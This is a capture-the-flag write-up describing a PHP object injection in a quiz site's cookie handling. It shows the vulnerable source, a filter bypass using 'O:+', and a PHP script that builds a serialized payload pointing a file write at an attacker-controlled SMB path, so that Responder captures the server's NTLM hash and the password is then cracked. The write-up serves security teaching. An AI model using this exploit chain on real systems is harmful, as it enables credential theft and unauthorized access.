This challenge was a cool real world scenario and we were the only team to solve it, so it's a good excuse to do a writeup.

The challenge question was just an URL, after you visit it you can signup with username and email and start a quiz.

Among the quiz questions there were these two interesting strings:
```
Relax, here is the hint: [admin]
Great, here is the second hint: [source_882c1aaf3.zip]
```

Visiting `/admin` presented us a login page with a comment which allowed us to understand that the authentication was using `LDAP`.

In the `source_882c1aaf3.zip` we found the source code of all non admin pages: [index.php](./index.php), [lib.php](./lib.php) and [quiz.php](./quiz.php).

After a quick analysis we discovered a PHP Object Injection in [quiz.php](./quiz.php):
```
    if(isset($_POST['answer'])){

        $answer = (string)$_POST['answer'];
        $ck = base64_decode($_COOKIE['userinfo']);
        if(preg_match('/O:[0-9]+:"/',$ck)){ //Filter we need to bypass
            header("Location: quiz.php");
            die();
        }
        $userinfo = unserialize($ck); //Object Injection

        if(intval($_COOKIE['quiz_no']) > 19){
            $quiz = 'Each user needs to answer only 20 quizs! Please wait for response from us.';
        } elseif(is_array($userinfo)) {
            $tmp = new SaveAnswer($userinfo['username'],$userinfo['email'],$answer.PHP_EOL);
            $quiz = make_quiz($_COOKIE['quiz_no'], True);
        } else {
            die("Cannot get userinfo");
        }

    } else {
        $quiz = make_quiz($_COOKIE['quiz_no']);
    }
```

As you can see there is a filter we need to bypass to exploit it, as they are trying to prevent unserialization of PHP objects:
```
preg_match('/O:[0-9]+:"/',$ck)
```

However this filter can be bypassed by replacing the object length with a signed number (i.e. `O:5:"Class":1:{s:5:"param";s:5:"value";}` becomes `O:+5:"Class":1:{s:5:"param";s:5:"value";}`)

Now it's just a matter of finding the right object to unserialize to do some magic.

In [lib.php](./lib.php) we had an handy class which was included in [quiz.php](./quiz.php):
```
    class SaveAnswer {
        private $folder = 'C:\\Windows\\Temp\\';
        private $filename;
        private $anscontent;

        public function __construct($username, $email, $ans)
        {
            $this->filename = $username.'_'.str_replace(['@','.',' '],'_',$email);
            $this->anscontent = (string)$ans;
        }

        private function writeToFile($mode){
            $fullpath = $this->folder.$this->filename;

            if(!file_exists($fullpath.'.txt')){
                if(!preg_match('/^C:\x5cWindows\x5cTemp\x5c[a-zA-Z0-9\.\_]+$/i',$fullpath)){
                    return False;
                }
            }

            try{
                $file = fopen($fullpath.".txt", $mode);
                fwrite($file, $this->anscontent);
                fclose($file);
            } catch(Exception $e){
                return False;
            }
            return True;
        }

        public function __destruct()
        {
            $this->writeToFile("a+");
        }
    }
```

Cool, a class on a Windows Server which allowed us to write to a file and we could use the PHP Object Injection to instantiate this class with arbitrary parameters.

### LET'S DANCE SAMBA ###

Windows has a very cool feature, when you try to access a link like `\\ip\file` it is so nice to send the NTLM hash of the current user along with the request to try to login via Samba, so what if we try to exploit the PHP Object Injection and request a file via Samba from our server and log the NTLM hash?

To build the right serialized object we used the following PHP code:
```
<?php

class SaveAnswer {
        private $folder = '\\\\our_ip_here\\';
        private $filename = 'jbz';
        private $anscontent = 'jbz';

        public function __construct($username, $email, $ans)
        {
            $this->filename = $username.'_'.str_replace(['@','.',' '],'_',$email);
            $this->anscontent = (string)$ans;
        }
    }
  
$exp = new SaveAnswer('jbz','jbzteam@outlook.com','jbz');

echo base64_encode(str_replace("O:","O:+",serialize($exp)));
```

After sending a request to `quiz.php` with the generated payload in the `userinfo` cookie, we received this in our [Responder](https://github.com/SpiderLabs/Responder) server.

Now it was just a matter of launching [John The Ripper](https://github.com/magnumripper/JohnTheRipper) with the [rockyou wordlist](http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2) and wait the admin password to appear and use it to login in the admin panel.
